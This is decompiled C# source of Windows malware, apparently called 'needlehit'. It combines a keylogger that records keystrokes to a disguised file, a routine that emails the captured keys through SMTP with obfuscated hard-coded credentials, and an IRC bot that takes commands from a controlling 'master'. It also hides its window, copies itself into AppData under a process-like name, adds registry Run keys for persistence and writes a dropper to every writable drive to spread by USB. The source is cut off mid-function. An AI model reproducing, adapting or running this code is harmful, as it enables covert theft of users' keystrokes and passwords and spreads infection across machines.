using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using needlehit.My;
using needlehit.My.Resources;

namespace needlehit;

[DesignerGenerated]
public class Form1 : Form
{
	public class Keylogger_
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("timer1_")]
		private Timer _timer1_;

		public string lol;

		public int time;

		public int counter;

		private string file;

		public virtual Timer timer1_
		{
			[DebuggerNonUserCode]
			get
			{
				return _timer1_;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler eventHandler = timer1_Tick;
				if (_timer1_ != null)
				{
					_timer1_.remove_Tick(eventHandler);
				}
				_timer1_ = value;
				if (_timer1_ != null)
				{
					_timer1_.add_Tick(eventHandler);
				}
			}
		}

		public string keys => @int switch
		{
			8 => "[Backspace]", 
			9 => "[Tab]", 
			13 => "[Enter]", 
			16 => "[Shift]", 
			17 => "[Strg]", 
			18 => "[Alt]", 
			20 => "[Umstell.]", 
			32 => " ", 
			33 => "!", 
			34 => "\u00b4\u00b4", 
			35 => "#", 
			36 => "$", 
			37 => "%", 
			38 => "&", 
			39 => "'", 
			40 => "(", 
			41 => ")", 
			42 => "*", 
			43 => "+", 
			44 => ",", 
			45 => "-", 
			46 => ".", 
			47 => "/", 
			48 => "0", 
			49 => "1", 
			50 => "2", 
			51 => "3", 
			52 => "4", 
			53 => "5", 
			54 => "6", 
			55 => "7", 
			56 => "8", 
			57 => "9", 
			58 => ":", 
			59 => ";", 
			60 => "<", 
			61 => "=", 
			62 => ">", 
			63 => "?", 
			64 => "@", 
			65 => "a", 
			66 => "b", 
			67 => "c", 
			68 => "d", 
			69 => "e", 
			70 => "f", 
			71 => "g", 
			72 => "h", 
			73 => "i", 
			74 => "j", 
			75 => "k", 
			76 => "l", 
			77 => "m", 
			78 => "n", 
			79 => "o", 
			80 => "p", 
			81 => "q", 
			82 => "r", 
			83 => "s", 
			84 => "t", 
			85 => "u", 
			86 => "v", 
			87 => "w", 
			88 => "x", 
			89 => "y", 
			90 => "z", 
			91 => "[Win]", 
			92 => "[Win]", 
			93 => "]", 
			94 => "^", 
			95 => "_", 
			96 => "`", 
			97 => "a", 
			98 => "b", 
			99 => "c", 
			100 => "d", 
			101 => "e", 
			102 => "f", 
			103 => "g", 
			104 => "h", 
			105 => "i", 
			106 => "j", 
			107 => "k", 
			108 => "l", 
			109 => "m", 
			110 => "n", 
			111 => "o", 
			112 => "[F1]", 
			113 => "[F2]", 
			114 => "[F3]", 
			115 => "[F4]", 
			116 => "[F5]", 
			117 => "[F6]", 
			118 => "[F7]", 
			119 => "[F8]", 
			120 => "[F9]", 
			121 => "[F10]", 
			122 => "[F11]", 
			123 => "[F12]", 
			124 => "|", 
			125 => "}", 
			126 => "~", 
			128 => "€", 
			130 => "‚", 
			131 => "ƒ", 
			132 => "„", 
			133 => "…", 
			134 => "†", 
			135 => "‡", 
			136 => "ˆ", 
			138 => "Š", 
			139 => "‹", 
			142 => "Ž", 
			145 => "‘", 
			146 => "’", 
			147 => "\"", 
			148 => "\"", 
			149 => "•", 
			150 => "–", 
			151 => "—", 
			152 => "\u02dc", 
			153 => "™", 
			154 => "š", 
			155 => "›", 
			158 => "ž", 
			159 => "Ÿ", 
			160 => "", 
			161 => "", 
			162 => "", 
			163 => "", 
			164 => "[Alt]", 
			165 => "[Alt]", 
			166 => "¦", 
			167 => "§", 
			168 => "\u00a8", 
			169 => "©", 
			170 => "ª", 
			171 => "«", 
			172 => "¬", 
			174 => "®", 
			175 => "\u00af", 
			176 => "°", 
			177 => "±", 
			178 => "²", 
			179 => "³", 
			180 => "\u00b4", 
			181 => "µ", 
			183 => ".", 
			184 => "\u00b8", 
			185 => "¹", 
			186 => "ü", 
			187 => "+", 
			188 => ",", 
			189 => "-", 
			190 => ".", 
			191 => "¿", 
			192 => "ö", 
			193 => "Á", 
			194 => "Â", 
			195 => "Ã", 
			196 => "Ä", 
			197 => "Æ", 
			198 => "Ç", 
			199 => "È", 
			200 => "É", 
			201 => "Ê", 
			202 => "Ë", 
			203 => "Ì", 
			204 => "Í", 
			205 => "Í", 
			206 => "Î", 
			207 => "Ï", 
			208 => "Ð", 
			209 => "Ñ", 
			210 => "Ò", 
			211 => "Ó", 
			212 => "Ô", 
			213 => "Õ", 
			214 => "Ö", 
			215 => "×", 
			216 => "Ø", 
			217 => "Ù", 
			218 => "Ú", 
			219 => "Û", 
			220 => "Ü", 
			221 => "Ý", 
			222 => "ä", 
			223 => "ß", 
			224 => "à", 
			225 => "á", 
			226 => "â", 
			227 => "<", 
			228 => "ä", 
			229 => "æ", 
			230 => "ç", 
			231 => "è", 
			232 => "é", 
			233 => "ê", 
			234 => "ë", 
			235 => "ì", 
			236 => "í", 
			237 => "í", 
			238 => "î", 
			239 => "ï", 
			240 => "ð", 
			241 => "ñ", 
			242 => "ò", 
			243 => "ó", 
			244 => "ô", 
			245 => "õ", 
			246 => "ö", 
			247 => "÷", 
			248 => "ø", 
			249 => "ù", 
			250 => "ú", 
			251 => "û", 
			252 => "ü", 
			253 => "ý", 
			254 => "þ", 
			255 => "ÿ", 
			_ => "", 
		};

		public Keylogger_()
		{
			__ENCAddToList(this);
			lol = "";
			time = 0;
			counter = 0;
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetAsyncKeyState(int vkey);

		public void start_()
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected O, but got Unknown
			file = Application.get_StartupPath() + "\\*n*e*e*d*l*e*h*i*t*.*w*i*n*d*o*w*s*3*2*.*s*y*s".Replace("*", "");
			timer1_ = new Timer();
			timer1_.set_Interval(50);
			timer1_.Start();
		}

		public void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					lol += g();
					if (counter == 332000)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, lol, true);
						lol = "";
						counter = 0;
					}
					else
					{
						counter++;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void sendm()
		{
			MailMessage mailMessage = new MailMessage();
			NetworkCredential networkCredential = new NetworkCredential();
			networkCredential.UserName = love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew");
			networkCredential.Password = love_is_hard.entnerd("wqi#po#wqz#wqt#wqz#zt#zu#zo");
			mailMessage.IsBodyHtml = false;
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Host = love_is_hard.entnerd("wwe#wwe#wwt#tp#wqi#wwt#weu#zr#wwo#wwq#weu");
			smtpClient.Port = 25;
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = networkCredential;
			try
			{
				mailMessage.From = new MailAddress(love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew"));
				mailMessage.To.Add(love_is_hard.entnerd("wwq#wqu#wqr#wwe#wqw#wwz#wqu#wee#wwr#wet#wwo#wqo#wee#wwr#io#wwo#wez#wri#ut#wwp#wew"));
				mailMessage.Subject = "Data :" + ((ServerComputer)MyProject.Computer).get_Name() + " Date:" + Conversions.ToString(DateTime.Now.Day) + "." + Conversions.ToString(DateTime.Now.Month) + Conversions.ToString(DateTime.Now.Year) + " Time : " + Conversions.ToString(DateTime.Now.Minute) + ":" + Conversions.ToString(DateTime.Now.Hour);
				mailMessage.Body = lol;
				smtpClient.Send(mailMessage);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public string g()
		{
			int num = 1;
			do
			{
				if (GetAsyncKeyState(num) != -32767)
				{
					num = checked(num + 1);
					continue;
				}
				return this.get_keys(num);
			}
			while (num <= 255);
			return "";
		}
	}

	public class love_is_hard
	{
		[DebuggerNonUserCode]
		public love_is_hard()
		{
		}

		public static string entnerd(string Text)
		{
			//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
			string text = "";
			string[] array = Text.Split(new char[1] { '#' });
			int num = 0;
			checked
			{
				int num2 = array.Length - 1;
				int num3 = 0;
				while (true)
				{
					int num4 = num3;
					int num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					string text2 = "";
					int num6 = array[num3].Length - 1;
					int num7 = 0;
					while (true)
					{
						int num8 = num7;
						num5 = num6;
						if (num8 > num5)
						{
							break;
						}
						switch (array[num3][num7])
						{
						case 'a':
							text2 += ",";
							break;
						case 'e':
							text2 += "2";
							break;
						case 'i':
							text2 += "7";
							break;
						case 'o':
							text2 += "8";
							break;
						case 'p':
							text2 += "9";
							break;
						case 'q':
							text2 += "0";
							break;
						case 'r':
							text2 += "3";
							break;
						case 't':
							text2 += "4";
							break;
						case 'u':
							text2 += "6";
							break;
						case 'w':
							text2 += "1";
							break;
						case 'z':
							text2 += "5";
							break;
						}
						num7++;
					}
					try
					{
						text += Conversions.ToString(Strings.Chr(int.Parse(text2) - num));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
						ProjectData.ClearProjectError();
					}
					num++;
					num3++;
				}
				return text;
			}
		}

		public static string vernerd(string Text)
		{
			string text = "";
			checked
			{
				int num = Text.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					string text2 = (Strings.Asc(Text[num2]) + num2).ToString();
					int num5 = text2.Length - 1;
					int num6 = 0;
					while (true)
					{
						int num7 = num6;
						num4 = num5;
						if (num7 > num4)
						{
							break;
						}
						switch (text2[num6])
						{
						case ',':
							text += "a";
							break;
						case '0':
							text += "q";
							break;
						case '1':
							text += "w";
							break;
						case '2':
							text += "e";
							break;
						case '3':
							text += "r";
							break;
						case '4':
							text += "t";
							break;
						case '5':
							text += "z";
							break;
						case '6':
							text += "u";
							break;
						case '7':
							text += "i";
							break;
						case '8':
							text += "o";
							break;
						case '9':
							text += "p";
							break;
						}
						num6++;
					}
					text += Interaction.IIf(Text.Length - 1 == num2, (object)"", (object)"#").ToString();
					num2++;
				}
				return text;
			}
		}
	}

	public class Ir
	{
		public delegate void THADEventHandler(string Text);

		public delegate void FehlerEventHandler(string Text);

		public class event_sp
		{
			public delegate void eventtype1EventHandler(string parm);

			private static List<WeakReference> __ENCList = new List<WeakReference>();

			private eventtype1EventHandler eventtype1Event;

			public string parm;

			public event eventtype1EventHandler eventtype1
			{
				[MethodImpl(MethodImplOptions.Synchronized)]
				[DebuggerNonUserCode]
				add
				{
					eventtype1Event = (eventtype1EventHandler)Delegate.Combine(eventtype1Event, value);
				}
				[MethodImpl(MethodImplOptions.Synchronized)]
				[DebuggerNonUserCode]
				remove
				{
					eventtype1Event = (eventtype1EventHandler)Delegate.Remove(eventtype1Event, value);
				}
			}

			[DebuggerNonUserCode]
			public event_sp()
			{
				__ENCAddToList(this);
			}

			[DebuggerNonUserCode]
			private static void __ENCAddToList(object value)
			{
				checked
				{
					lock (__ENCList)
					{
						if (__ENCList.Count == __ENCList.Capacity)
						{
							int num = 0;
							int num2 = __ENCList.Count - 1;
							int num3 = 0;
							while (true)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								WeakReference weakReference = __ENCList[num3];
								if (weakReference.IsAlive)
								{
									if (num3 != num)
									{
										__ENCList[num] = __ENCList[num3];
									}
									num++;
								}
								num3++;
							}
							__ENCList.RemoveRange(num, __ENCList.Count - num);
							__ENCList.Capacity = __ENCList.Count;
						}
						__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
					}
				}
			}

			public void Raise_event(string parm_)
			{
				eventtype1Event?.Invoke(parm_);
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		public readonly Random R;

		public readonly string Randnick;

		public string USER;

		public string NICK;

		public int PORT;

		public string CHANNEL;

		public string SERVER;

		public NetworkStream IRCstream;

		public StreamReader IRCreader;

		public StreamWriter IRCwriter;

		public TcpClient irc;

		public string inputLine;

		public string Log;

		public string master;

		private THADEventHandler THADEvent;

		private FehlerEventHandler FehlerEvent;

		public List<event_sp> eventtype_string;

		private string msgpriv;

		public event THADEventHandler THAD
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				THADEvent = (THADEventHandler)Delegate.Combine(THADEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				THADEvent = (THADEventHandler)Delegate.Remove(THADEvent, value);
			}
		}

		public event FehlerEventHandler Fehler
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				FehlerEvent = (FehlerEventHandler)Delegate.Combine(FehlerEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				FehlerEvent = (FehlerEventHandler)Delegate.Remove(FehlerEvent, value);
			}
		}

		public Ir()
		{
			__ENCAddToList(this);
			R = new Random();
			Randnick = Conversions.ToString(R.Next(100000));
			USER = love_is_hard.entnerd("oz#ot#iw#oz#ru#iw#wwt#wqt#wqi#wwu#te#op#wwr#wep#wrr#weu#wrq#wet#zq#oz#wez#wri#zt#weu#wrz#zi#ot#wqz#wrp#wtz#wrt#wru#wte#wru");
			eventtype_string = new List<event_sp>();
			msgpriv = love_is_hard.entnerd("oq#or#iz#op#ow#oo#ii#rp");
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public bool Connect(string Nick_, string Channel_, string server_, string Port_)
		{
			try
			{
				NICK = Nick_;
				CHANNEL = Channel_;
				SERVER = server_;
				PORT = Conversions.ToInteger(Port_);
				irc = new TcpClient(SERVER, PORT);
				IRCstream = irc.GetStream();
				IRCreader = new StreamReader(IRCstream);
				IRCwriter = new StreamWriter(IRCstream);
				IRCwriter.WriteLine(USER);
				IRCwriter.Flush();
				IRCwriter.WriteLine(love_is_hard.entnerd("io#it#up#io#ru") + NICK);
				IRCwriter.Flush();
				Thread thread = new Thread(read);
				thread.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}

		public void addLog(string Message)
		{
			Log = Log + Message + "\r\n";
			THADEvent?.Invoke(Log);
		}

		public void read()
		{
			string text = love_is_hard.entnerd("oq#it#oq#it#ru#ur");
			string text2 = love_is_hard.entnerd("oq#oq#oq#it#ru#ur");
			string text3 = love_is_hard.entnerd("it#oq#iz#ow#ru");
			string value = love_is_hard.entnerd("ii#oq#iq#ie#ru");
			checked
			{
				while (true)
				{
					try
					{
						inputLine = IRCreader.ReadLine();
						addLog(inputLine);
						if (inputLine.Contains(value))
						{
							IRCwriter.WriteLine(text3 + CHANNEL);
							IRCwriter.Flush();
						}
						if (inputLine.Contains(text))
						{
							int startIndex = inputLine.IndexOf(text);
							string text4 = new string(Conversions.ToCharArrayRankOne(inputLine.Substring(startIndex)));
							string text5 = new string(Conversions.ToCharArrayRankOne(text4.Replace(text, string.Empty)));
							IRCwriter.WriteLine(text2 + text5);
							IRCwriter.Flush();
						}
						int num = eventtype_string.Count - 1;
						int num2 = 0;
						while (true)
						{
							int num3 = num2;
							int num4 = num;
							if (num3 <= num4)
							{
								if (inputLine.Contains(eventtype_string[num2].parm) & inputLine.StartsWith(":" + master + "!"))
								{
									eventtype_string[num2].Raise_event(inputLine);
								}
								num2++;
								continue;
							}
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						FehlerEvent?.Invoke(ex2.ToString());
						ProjectData.ClearProjectError();
						break;
					}
				}
			}
		}

		public void Send(string Text)
		{
			IRCwriter.WriteLine(msgpriv + CHANNEL + " : \u0003" + Text);
			IRCwriter.Flush();
		}
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private Random rnd;

	public List<string> st;

	private Keylogger_ key;

	private string name_s;

	private Ir irc;

	private string er;

	private string nier;

	private string aller;

	private string siter;

	private string fehlerd;

	private string fileser;

	private string ordner;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		rnd = new Random();
		st = new List<string>();
		key = new Keylogger_();
		irc = new Ir();
		er = love_is_hard.entnerd("wqw#wwz#wqt#wwt#wwe#wqo#weq#wqo#wwr#wqo#wwt");
		nier = love_is_hard.entnerd("wwq#wqu#wqw#wqi#weq#ri#wqi#wew#wwq#weq#wwo#wwt#weu#wwt#wwp#wwt#weq");
		aller = love_is_hard.entnerd("tz#po#wwq#www");
		siter = love_is_hard.entnerd("tz#wwu#wqi#wwp#wqz#ri");
		fehlerd = love_is_hard.entnerd("iq#wqe#wqu#www#wqz#wwp");
		fileser = love_is_hard.entnerd("tz#wqr#wqi#www#wqz#weq");
		ordner = love_is_hard.entnerd("tz#wwe#wwu#wqr#wwt#wqu#weq");
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(256, 154);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		st.Add(love_is_hard.entnerd("wwu#po#wwi#wwq#wwr#wqo#weq"));
		st.Add(love_is_hard.entnerd("pp#wwq#wqe"));
		st.Add(love_is_hard.entnerd("wqp#wwu#wqw#wwt#wwt#wqi#www#wwq"));
		st.Add(love_is_hard.entnerd("or#wwe#wqt#wwp#wer#wqe#weq#wqo#wqq#ou#wwz#wwq#weu#wet#wep#weu#wwo#wrr#wwq#wqu#wez#wrw#wee#wrt#wtr#wtq#wwo#pt#wtz#wtr#wtt#wre#wte#wtp#weq#wru#wzq#wze#wtr#wzq#wzq#wrr#wet#wuq#wzt"));
		st.Add(love_is_hard.entnerd("or#wwe#wqt#wwp#wer#wqe#weq#wqo#wqq#ou#wwz#wwq#weu#wet#wep#weu#wwo#wrr#wwq#wqu#wez#wrw#wee#wrt#wtr#wtq#wwo#pt#wtz#wtr#wtt#wre#wte#wtp#weq#wru#wzq#wze#wtr#wzq#wzq#wrr#wet#wuq#wzt#wet#wzu#wtu#wtp"));
		st.Add(love_is_hard.entnerd("oi#wwe#wqu#wwt#wwp#wew#ro#pt#wwr#wwp#wwq#wee#wrw#weo#tu#pt#wqq#pi#zq#pw#wrw#wru#wro"));
		st.Add(love_is_hard.entnerd("uz#wqt#wqr#wqw#wwz#wwu#wee"));
		st.Add(love_is_hard.entnerd("zz#zr#zp#zt#zo#zi#ur#ur#zo#uq#ut#ur#up#uz#ui#up#ut#it#up#iw#it#it#ip#iz#iu#ir#ip#io#oq#iz#wtu#wzw#wto"));
		name_s = love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#wez#wre#wei");
		string path = love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#www#wrw#wwr");
		string zelle = love_is_hard.entnerd("uo#iq#up#oz#ii#oz#pq#ii#ow#pe#oe");
		checked
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Application.get_StartupPath(), st[7])))
			{
				if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s)))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().MoveFile(Application.get_ExecutablePath(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path));
					string text = love_is_hard.entnerd("rz#ow#wwu#wwt#wqr#wqu#wew#wee#wwo#wqu#wwp#wwe#zz#zo#ue#uq#ut#ue#uu#ut#zz#op#pw#pq#wqu#po#wqu#www#po#wqe#wwr#wqr#iz");
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), text + GEN(), false);
					save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle, GEN());
					CN();
					Aut();
					((Form)this).Close();
				}
				if (Operators.CompareString(read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle), Interaction.Command(), false) == 0)
				{
					save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle, GEN());
				}
				CN();
				Aut();
				string path2 = love_is_hard.entnerd("oz#ot#uo#rz#op#wwi#wqu#wqt#wet#wwq#zu#wwe#wre#wwt");
				List<string> uSB_Driver = Get_USB_Driver();
				int num = uSB_Driver.Count - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					if (!File.Exists(Path.Combine(uSB_Driver[num2], path2)))
					{
						File.WriteAllBytes(Path.Combine(uSB_Driver[num2], path2), Resources.Droper_Needlehit_a);
					}
					num2++;
				}
				Timer1.Start();
				key.start_();
			}
			else
			{
				((Form)this).Close();
			}
		}
	}

	public string GEN()
	{
		string text = "";
		int num = 0;
		checked
		{
			do
			{
				char[] array = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
				text += Conversions.ToString(array[rnd.Next(0, array.Length - 1)]);
				num++;
			}
			while (num <= 30);
			return text;
		}
	}

	public void Aut()
	{
		string zelle = love_is_hard.entnerd("uo#iq#up#oz#ii#oz#pq#ii#ow#pe#oe");
		string zelle2 = love_is_hard.entnerd("oq#wwz#wwr#wqe#wqz#weq#wew#wwi#wqz#wwo#www");
		string path = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle2);
		string text = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle);
		RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey(st[3]);
		registryKey.SetValue(st[5], Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey.Close();
		RegistryKey registryKey2 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey(st[4]);
		registryKey2.SetValue(st[6], Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey2.Close();
	}

	public void CN()
	{
		Process[] processes = Process.GetProcesses();
		string text = "";
		string text2 = love_is_hard.entnerd("tu#wqe#wee#wqt");
		do
		{
			text = processes[rnd.Next(0, 5)].ProcessName;
		}
		while (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + text2));
		string zelle = love_is_hard.entnerd("oq#wwz#wwr#wqe#wqz#weq#wew#wwi#wqz#wwo#www");
		string text3 = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle);
		string text4 = love_is_hard.entnerd("wwq#wqe#wqr#wqr#wwe#wqu#wwq#wwe#wet#zz#www#wrw#wwr");
		if (Operators.CompareString(text3, love_is_hard.entnerd("tz#tp#ti#zw#tp#zr#zw"), false) == 0)
		{
			text3 = text4;
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), text3), text + text2);
		save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name_s), zelle, text + text2);
	}

	public void save_proporty(string file, string zelle, string data)
	{
		checked
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(file))
			{
				string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
				int num = array.Length - 1;
				int num2 = 0;
				string[] array2;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						array2 = array[num2].Split(new char[1] { '+' });
						if (Operators.CompareString(array2[0], zelle, false) == 0)
						{
							break;
						}
						num2++;
						continue;
					}
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
					return;
				}
				array[num2] = array[num2].Replace(array2[1], data);
				string text = "";
				int num5 = array.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					text = text + array[num6] + Interaction.IIf(num6 == array.Length - 1, (object)"", (object)"#").ToString();
					num6++;
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, text, false);
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
			}
		}
	}

	public string read_proporty(string file, string zelle)
	{
		string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			string[] array2;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					array2 = array[num2].Split(new char[1] { '+' });
					if (Operators.CompareString(array2[0], zelle, false) == 0)
					{
						break;
					}
					num2++;
					continue;
				}
				return love_is_hard.entnerd("tz#tp#ti#zw#tp#zr#zw");
			}
			return array2[1];
		}
	}

	public List<string> Get_USB_Driver()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		checked
		{
			int num = drives.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				string fullName = drives[num2].RootDirectory.FullName;
				try
				{
					File.WriteAllText(fullName + "\\a.", "");
					File.Delete(fullName + "\\a.");
					list.Add(fullName);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
